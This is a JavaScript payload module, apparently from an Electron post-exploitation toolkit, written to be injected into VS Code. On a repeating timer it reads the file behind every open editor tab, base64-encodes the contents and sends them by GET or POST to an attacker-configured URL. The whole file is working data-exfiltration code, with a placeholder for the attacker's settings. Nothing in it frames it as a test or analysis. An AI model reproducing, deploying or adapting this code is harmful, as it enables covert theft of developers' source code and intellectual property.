if (typeof Beemka_VSCode_Sources === 'undefined') {

    %BEEMKA_VARIABLE_PLACEHOLDER%

    var options = {
        url: beemka_code_url,
        interval: beemka_code_interval,
        file_param: beemka_code_file_param,
        data_param: beemka_code_data_param,
        method: beemka_code_method,
        files: []
    };

    var Beemka_VSCode_Sources = {
        interval: options.interval,
        url: options.url,
        file_param: options.file_param,
        data_param: options.data_param,
        method: options.method,
        files: [],
        fs: null,

        init: function() {
            Beemka_VSCode_Sources.fs = require('fs');
            Beemka_VSCode_Sources.cleanParams();
            Beemka_VSCode_Sources.startSourceCodeMonitoringInterval();
        },

        cleanParams: function() {
            Beemka_VSCode_Sources.interval = parseInt(Beemka_VSCode_Sources.interval);
            Beemka_VSCode_Sources.method = (Beemka_VSCode_Sources.method.toLowerCase() == 'post') ? 'POST' : 'GET';
        },

        startSourceCodeMonitoringInterval: function() {
            Beemka_VSCode_Sources.sendData();

            setTimeout(() => {
                Beemka_VSCode_Sources.startSourceCodeMonitoringInterval();
            }, Beemka_VSCode_Sources.interval);
        },

        sendData: function() {
            document.querySelectorAll('div[role="tablist"] div[role="presentation"]').forEach((tab) => {
                var path = tab.title;
                var fileData = Beemka_VSCode_Sources.fs.readFileSync(path, 'utf-8');
                if (Beemka_VSCode_Sources.isAlreadySent(path)) {
                    return true;
                }
                Beemka_VSCode_Sources.files.push(path);

//                fileData = "<br># BEEMKA - " + path + '<br>' + fileData;
                Beemka_VSCode_Sources.httpRequest(path, btoa(fileData));
            });
        },

        isAlreadySent: function(path) {
            return (Beemka_VSCode_Sources.files.indexOf(path) >= 0);
        },

        httpRequest: function(file, data) {
            var xhttp = new XMLHttpRequest();
            if (Beemka_VSCode_Sources.method == 'GET') {
                xhttp.open("GET", Beemka_VSCode_Sources.url + '?' + Beemka_VSCode_Sources.file_param + '=' + encodeURIComponent(file) + '&' + Beemka_VSCode_Sources.data_param + '=' + encodeURIComponent(data), true);
                xhttp.send();
            } else {
                xhttp.open('POST', Beemka_VSCode_Sources.url, true);
                xhttp.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
                xhttp.send(Beemka_VSCode_Sources.file_param + "=" + encodeURIComponent(file) + '&' + Beemka_VSCode_Sources.data_param + '=' + encodeURIComponent(data));
            }
        }
    };

    Beemka_VSCode_Sources.init();
}